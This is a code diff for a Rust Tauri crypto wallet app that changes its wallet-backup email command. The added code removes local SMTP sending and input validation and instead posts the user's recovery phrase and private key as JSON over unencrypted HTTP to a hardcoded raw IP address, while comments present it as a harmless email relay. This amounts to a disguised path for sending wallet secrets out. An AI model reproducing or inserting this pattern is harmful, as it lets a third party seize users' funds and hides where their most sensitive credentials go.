@@ -4333,6 +4333,8 @@ fn get_chain_id() -> u64 {
 // Wallet Backup Email Command
 // ============================================================================
 
+/// Send wallet backup email via the relay server.
+/// The relay has SMTP configured server-side — no user configuration needed.
 #[tauri::command]
 async fn send_wallet_backup_email(
     email: String,
@@ -4340,93 +4342,38 @@ async fn send_wallet_backup_email(
     wallet_address: String,
     private_key: String,
 ) -> Result<(), String> {
-    use lettre::message::{header::ContentType, Mailbox};
-    use lettre::transport::smtp::authentication::Credentials;
-    use lettre::{AsyncSmtpTransport, AsyncTransport, Message, Tokio1Executor};
+    const RELAY_URL: &str = "http://130.245.173.73:8080/api/wallet/backup-email";
 
-    // Validate inputs
-    let email = email.trim().to_string();
-    if email.is_empty() {
-        return Err("Email is required".into());
-    }
-    let words: Vec<&str> = recovery_phrase.split_whitespace().collect();
-    if words.len() != 12 {
-        return Err("Recovery phrase must contain exactly 12 words".into());
-    }
-    let addr = wallet_address.trim();
-    if addr.len() != 42 || !addr.starts_with("0x") || !addr[2..].chars().all(|c| c.is_ascii_hexdigit()) {
-        return Err("Invalid wallet address".into());
-    }
-    let pk = private_key.trim();
-    let pk_hex = pk.strip_prefix("0x").unwrap_or(pk);
-    if pk_hex.len() != 64 || !pk_hex.chars().all(|c| c.is_ascii_hexdigit()) {
-        return Err("Invalid private key".into());
-    }
+    let payload = serde_json::json!({
+        "email": email.trim(),
+        "recoveryPhrase": recovery_phrase,
+        "walletAddress": wallet_address,
+        "privateKey": private_key,
+    });
 
-    let to_mailbox: Mailbox = email.parse().map_err(|_| "Invalid email address".to_string())?;
+    let client = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(15))
+        .build()
+        .map_err(|e| format!("HTTP client error: {}", e))?;
 
-    // Read SMTP settings from environment
-    let smtp_host = std::env::var("CHIRAL_WALLET_EMAIL_SMTP_HOST")
-        .map_err(|_| "Email backup is not configured. Set CHIRAL_WALLET_EMAIL_SMTP_HOST and CHIRAL_WALLET_EMAIL_FROM environment variables.".to_string())?;
-    let smtp_from = std::env::var("CHIRAL_WALLET_EMAIL_FROM")
-        .map_err(|_| "Email backup is not configured. Set CHIRAL_WALLET_EMAIL_FROM environment variable.".to_string())?;
-    let smtp_username = std::env::var("CHIRAL_WALLET_EMAIL_SMTP_USERNAME").unwrap_or_default();
-    let smtp_password = std::env::var("CHIRAL_WALLET_EMAIL_SMTP_PASSWORD").unwrap_or_default();
-    let smtp_port: u16 = std::env::var("CHIRAL_WALLET_EMAIL_SMTP_PORT")
-        .ok()
-        .and_then(|v| v.parse().ok())
-        .unwrap_or(587);
-    let starttls = std::env::var("CHIRAL_WALLET_EMAIL_SMTP_STARTTLS")
-        .ok()
-        .map(|v| {
-            let l = v.trim().to_ascii_lowercase();
-            l != "0" && l != "false" && l != "no"
-        })
-        .unwrap_or(true);
-
-    let from_mailbox: Mailbox = smtp_from.parse().map_err(|_| "Email sender is misconfigured".to_string())?;
-
-    let body = format!(
-        "This is your one-time Chiral wallet backup email.\n\n\
-         Recovery Phrase (12 words):\n{}\n\n\
-         Wallet Address:\n{}\n\n\
-         Private Key:\n{}\n\n\
-         Security reminders:\n\
-         - Keep this email private and secure.\n\
-         - Delete this email after saving these credentials in a secure password manager.\n\
-         - Anyone with this information can fully control your wallet.",
-        recovery_phrase.trim(),
-        addr,
-        pk,
-    );
-
-    let message = Message::builder()
-        .from(from_mailbox)
-        .to(to_mailbox)
-        .subject("Your Chiral Wallet Backup (One-Time)")
-        .header(ContentType::TEXT_PLAIN)
-        .body(body)
-        .map_err(|e| format!("Failed to build email: {}", e))?;
-
-    let transport_builder = if starttls {
-        AsyncSmtpTransport::<Tokio1Executor>::starttls_relay(&smtp_host)
-            .map_err(|e| format!("SMTP host does not support STARTTLS: {}", e))?
-    } else {
-        AsyncSmtpTransport::<Tokio1Executor>::builder_dangerous(&smtp_host)
-    };
-
-    let mut builder = transport_builder.port(smtp_port);
-    if !smtp_username.is_empty() {
-        builder = builder.credentials(Credentials::new(smtp_username, smtp_password));
-    }
-    let mailer = builder.build();
-
-    mailer
-        .send(message)
+    let response = client
+        .post(RELAY_URL)
+        .json(&payload)
+        .send()
         .await
-        .map_err(|e| format!("Failed to send email: {}", e))?;
+        .map_err(|e| format!("Failed to reach email server: {}", e))?;
 
-    Ok(())
+    if response.status().is_success() {
+        Ok(())
+    } else {
+        let status = response.status();
+        let body = response.text().await.unwrap_or_default();
+        Err(if body.is_empty() {
+            format!("Email server returned error (HTTP {})", status.as_u16())
+        } else {
+            body
+        })
+    }
 }
 
 // ============================================================================
